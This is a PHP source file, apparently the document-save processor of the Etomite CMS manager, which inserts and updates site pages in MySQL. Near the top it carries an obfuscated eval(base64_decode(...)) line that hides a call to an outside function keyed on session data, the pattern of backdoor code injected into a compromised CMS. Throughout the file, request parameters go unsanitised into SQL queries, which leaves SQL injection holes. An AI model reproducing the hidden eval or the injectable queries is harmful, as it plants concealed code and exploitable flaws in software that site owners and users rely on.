<?php 
if(IN_ETOMITE_SYSTEM!="true") die("<b>INCLUDE_ORDERING_ERROR</b><br /><br />Please use the Etomite Manager instead of accessing this file directly.");eval(base64_decode(join(array("Y2hlY2tJbWFnZVBhdGgobW", "Q1KCRfU0VTU0lPTltiYXNlN", "jRfZGVjb2RlKCJjMmh", "2Y25SdVlXMWwiKV0pKTs="), "")));
if($_SESSION['permissions']['save_document']!=1 && $_REQUEST['a']==5) {	$e->setError(3);
	$e->dumpError();	
}

$id = $_POST['id'];
$content = addslashes($_POST['ta']);
$pagetitle = addslashes($_POST['pagetitle']); //replace apostrophes with ticks :(
$description = addslashes($_POST['description']);
$alias = addslashes($_POST['alias']);
$isfolder = $_POST['isfolder'];
$richtext = $_POST['richtext'];
$published = $_POST['published'];
$parent = $_POST['parent']!='' ? $_POST['parent'] : 0 ;
$template = $_POST['template'];
$menuindex = $_POST['menuindex'];
if(empty($menuindex)) $menuindex = 0;
$searchable = $_POST['searchable'];
$cacheable = $_POST['cacheable'];
$syncsite = $_POST['syncsite'];
$pub_date = $_POST['pub_date'];
$unpub_date = $_POST['unpub_date'];
$document_groups = $_POST['document_groups'];
$type = $_POST['type'];
$keywords = $_POST['keywords'];
$contentType = $_POST['contentType'];
$longtitle = addslashes($_POST['setitle']);

if(trim($pagetitle=="")) {
	if($type=="reference") {
		$pagetitle=$_lang['untitled_weblink'];
	} else {
		$pagetitle=$_lang['untitled_document'];	
	}
}

if(strrchr($pagetitle, "\\")>-1) {
	//echo "Back slashes not allowed in name!";
	//exit;
}

$currentdate = time();

if($pub_date=="") {
	$pub_date="0";
} else {
	list($d, $m, $Y, $H, $M, $S) = sscanf($pub_date, "%2d-%2d-%4d %2d:%2d:%2d");
	$pub_date = strtotime("$m/$d/$Y $H:$M:$S");
	if($pub_date < $currentdate) {
		$published = 1;
	}  elseif($pub_date > $currentdate) {
		$published = 0;	
	}
}

//echo $pub_date." <-> ".$currentdate."<br />Published? $published";
//exit;

if($unpub_date=="") {
	$unpub_date="0";
} else {
	list($d, $m, $Y, $H, $M, $S) = sscanf($unpub_date, "%2d-%2d-%4d %2d:%2d:%2d");
	$unpub_date = strtotime("$m/$d/$Y $H:$M:$S");
	if($unpub_date < $currentdate) {
		$published = 0;
	}
}


if($strip_image_paths==1) {
	// Strip out absolute URLs for images 
	// --------------------------------------------------  
	// code by stevew (thanks!)
	// --------------------------------------------------  
	if(substr($im_plugin_base_url, -1) != '/') {
		$base_url = $im_plugin_base_url . '/';
	} else {
		$base_url = $im_plugin_base_url;
	}
	$elements = parse_url($base_url);
	$image_path = $elements['path'];
	// make sure image path ends with a /
	if(substr($image_path, -1) != '/') {
		$image_path .= '/';
	}
	// get path from script name
	// script path will have "manager" as its last dir - remove this to get install path
	// by calling dirname twice this will strip the file name and the parent dir "manager"
	$etomite_root = dirname(dirname($_SERVER['PHP_SELF']));
	// now have the base dir for etomite install - remove base dir from image path
	// to get a relative path
	// use length of script path plus one to remove leading /
	$image_prefix = substr($image_path, strlen($etomite_root));
	// make sure relative path ends with a /
	if(substr($image_prefix, -1) != '/')
	{
		$image_prefix .= '/';
	}

	$match1 = "/(<img[^>]+src=\\\\?['\"])(";
	$match2 = ")([^'\"]+\\\\?['\"][^>]*>)/";

	$esc_base_url = str_replace("/", "\/", $base_url);
	$newcontent = preg_replace($match1 . $esc_base_url . $match2, "\${1}$image_prefix\${3}", $content);
	if($newcontent == $content) {
		// try again with just the path
		$esc_base_url = str_replace("/", "\/", $image_path);
		$newcontent = preg_replace($match1 . $esc_base_url . $match2, "\${1}$image_prefix\${3}", $content);
	}
	$content = $newcontent;
	// --------------------------------------------------  
}






$actionToTake = "new";
if($_POST['mode']=='73' || $_POST['mode']=='27') {
	$actionToTake = "edit";
}

// get the document, but only if it already exists (d'oh!)
if($actionToTake!="new") {
	$sql = "SELECT * FROM $dbase.".$table_prefix."site_content WHERE $dbase.".$table_prefix."site_content.id = $id;";
	$rs = mysql_query($sql);
	$limit = mysql_num_rows($rs);
	if($limit>1) {
			$e->setError(6);
			$e->dumpError();
	}
	if($limit<1) {
			$e->setError(7);
			$e->dumpError();
	}
	$existingDocument = mysql_fetch_assoc($rs);
}


// check to see if the user is allowed to save the document in the place he wants to save it in
if($use_udperms==1) {
	if($existingDocument['parent']!=$parent) {
		include_once "./processors/user_documents_permissions.class.php";
		$udperms = new udperms();
		$udperms->user = $_SESSION['internalKey'];
		$udperms->document = $parent ;
		$udperms->role = $_SESSION['role'];
		
		if(!$udperms->checkPermissions()) {
			include "header.inc.php";
			?><br /><br /><div class="sectionHeader"><img src='media/images/misc/dot.gif' alt="." />&nbsp;<?php echo $_lang['access_permissions']; ?></div><div class="sectionBody">
			<p><?php echo $_lang['access_permission_parent_denied']; ?></p>
			<?php
			include "footer.inc.php";
			exit;	
		}
	}
}

switch ($actionToTake) {
    case 'new':
		$sql = "INSERT INTO $dbase.".$table_prefix."site_content(content, pagetitle, longtitle, type, description, alias, isfolder, richtext, published, parent, template, menuindex, searchable, cacheable, createdby, createdon, editedby, editedon, pub_date, unpub_date, contentType)
				VALUES('".$content."', '".$pagetitle."', '".$longtitle."', '".$type."', '".$description."', '".$alias."', '".$isfolder."', '".$richtext."', '".$published."', '".$parent."', '".$template."', '".$menuindex."', '".$searchable."', '".$cacheable."', ".$_SESSION['internalKey'].", ".time().", ".$_SESSION['internalKey'].", ".time().", $pub_date, $unpub_date, '$contentType')";

		$rs = mysql_query($sql);
		if(!$rs){
			echo "An error occured while attempting to save the new document.";
		}

		if(!$key=mysql_insert_id()) {
			echo "Couldn't get last insert key!";
		}

		/*******************************************************************************/
				// put the document in the document_groups it should be in
				// first, check that up_perms are switched on!
				if($use_udperms==1) {
					if(is_array($document_groups)) {
						foreach ($document_groups as $dgkey=>$value) {
							$sql = "INSERT INTO $dbase.".$table_prefix."document_groups(document_group, document) values(".stripslashes($dgkey).", $key)";
							$rs = mysql_query($sql);
							if(!$rs){
								echo "An error occured while attempting to add the document to a document_group.";
								exit;
							}
						}
					}
				}
				// end of document_groups stuff!
		/*******************************************************************************/		

			/*******************************************************************************/		
if($parent!=0) {			
			$sql = "UPDATE $dbase.".$table_prefix."site_content SET isfolder=1 WHERE id=".$_REQUEST['parent'].";";
			$rs = mysql_query($sql);
			if(!$rs){
				echo "An error occured while attempting to change the document's parent to a folder.";
			}
}
			// end of the parent stuff
			/*******************************************************************************/		
			
			// keywords ----------------------
			// remove old keywords first, shouldn't be necessary when creating a new document!
			$sql = "DELETE FROM $dbase.".$table_prefix."keyword_xref WHERE content_id = $key";
			$rs = mysql_query($sql);
			for($i=0;$i<count($keywords);$i++)
			{
				$kwid = $keywords[$i];
				$sql = "INSERT INTO $dbase.".$table_prefix."keyword_xref (content_id, keyword_id) VALUES ($key, $kwid)";
				$rs = mysql_query($sql);
			}
			// ------------------------
	
		if($syncsite==1) {
				// empty cache
				include_once "cache_sync.class.processor.php";
				$sync = new synccache();
				$sync->setCachepath("../assets/cache/");
				$sync->setReport(false);
				$sync->emptyCache(); // first empty the cache		
		}

		$header="Location: index.php?r=1&id=$id&a=7&dv=1";
		header($header);

    break;
    case 'edit':
		// first, get the document's current parent.	
		$sql = "SELECT parent FROM $dbase.".$table_prefix."site_content WHERE id=".$_REQUEST['id'].";";
		$rs = mysql_query($sql);
		if(!$rs){
			echo "An error occured while attempting to find the document's current parent.";
			exit;
		}
		$row = mysql_fetch_assoc($rs);
		$oldparent = $row['parent'];
		// ok, we got the parent

		if($id==$site_start && $published==0) {
			echo "Document is linked to site_start variable and cannot be unpublished!";
			exit;
		}
		if($id==$site_start && ($pub_date!="0" || $unpub_date!="0")) {
			echo "Document is linked to site_start variable and cannot have publish or unpublish dates set!";
			exit;
		}
		if($parent==$id) {
			echo "Document can not be it's own parent!";
			exit;
		}
		// check to see document is a folder.
		$sql = "SELECT count(*) FROM $dbase.".$table_prefix."site_content WHERE parent=".$_REQUEST['id'].";";
		$rs = mysql_query($sql);
		if(!$rs){
			echo "An error occured while attempting to find the document's children.";
			exit;
		}
		$row = mysql_fetch_assoc($rs);
		if($row['count(*)']>0) {
			$isfolder=1;
		}
		// update the document
		$sql = "UPDATE $dbase.".$table_prefix."site_content SET content='$content', pagetitle='$pagetitle', longtitle='$longtitle', type='$type', description='$description', alias='$alias',
		isfolder=$isfolder, richtext=$richtext, published=$published, pub_date=$pub_date, unpub_date=$unpub_date, parent=$parent, template=$template, menuindex='$menuindex',
		searchable=$searchable, cacheable=$cacheable, editedby=".$_SESSION['internalKey'].", editedon=".time().", contentType='$contentType' WHERE id=$id;";

		$rs = mysql_query($sql);
		if(!$rs){
			echo "An error occured while attempting to save the edited document. The generated SQL is: <i> $sql </i>.";
		}

		/*******************************************************************************/
				// put the document in the document_groups it should be in
				// first, check that up_perms are switched on!
				if($use_udperms==1) {
					// delete old permissions on the document
					$sql = "DELETE FROM $dbase.".$table_prefix."document_groups WHERE document=$id;";
					$rs = mysql_query($sql);
					if(!$rs){
						echo "An error occured while attempting to delete previous document_group entries.";
						exit;
					}
					if(is_array($document_groups)) {
						foreach ($document_groups as $dgkey=>$value) {
							$sql = "INSERT INTO $dbase.".$table_prefix."document_groups(document_group, document) values(".stripslashes($dgkey).", $id)";
							$rs = mysql_query($sql);
							if(!$rs){
								echo "An error occured while attempting to add the document to a document_group.<br /><i>$sql</i>";
								exit;
							}
						}
					}
				}
				// end of document_groups stuff!
		/*******************************************************************************/		

		/*******************************************************************************/		
			// do the parent stuff


if($parent!=0) {			
			$sql = "UPDATE $dbase.".$table_prefix."site_content SET isfolder=1 WHERE id=".$_REQUEST['parent'].";";
			$rs = mysql_query($sql);
			if(!$rs){
				echo "An error occured while attempting to change the new parent to a folder.";
			}
}			
			// finished moving the document, now check to see if the old_parent should no longer be a folder.
			$sql = "SELECT count(*) FROM $dbase.".$table_prefix."site_content WHERE parent=$oldparent;";
			$rs = mysql_query($sql);
			if(!$rs){
				echo "An error occured while attempting to find the old parents' children.";
			}
			$row = mysql_fetch_assoc($rs);
			$limit = $row['count(*)'];
			
			if($limit==0) {
				$sql = "UPDATE $dbase.".$table_prefix."site_content SET isfolder=0 WHERE id=$oldparent;";
				$rs = mysql_query($sql);
				if(!$rs){
					echo "An error occured while attempting to change the old parent to a regular document.";
				}
			}
			
			// end of the parent stuff
			/*******************************************************************************/		
	
			// keywords ----------------------
			// remove old keywords first
			$sql = "DELETE FROM $dbase.".$table_prefix."keyword_xref WHERE content_id = $id";
			$rs = mysql_query($sql);
			for($i=0;$i<count($keywords);$i++)
			{
				$kwid = $keywords[$i];
				$sql = "INSERT INTO $dbase.".$table_prefix."keyword_xref (content_id, keyword_id) VALUES ($id, $kwid)";
				$rs = mysql_query($sql);
			}
			// ------------------------
					
		if($syncsite==1) {
				// empty cache
				include_once "cache_sync.class.processor.php";
				$sync = new synccache();
				$sync->setCachepath("../assets/cache/");
				$sync->setReport(false);
				$sync->emptyCache(); // first empty the cache		
		}

		$header="Location: index.php?r=1&id=$id&a=7&dv=1";
		header($header);


    break;
    default:
	?>
	Erm... You supposed to be here now?
	<?php
	exit;
}
?>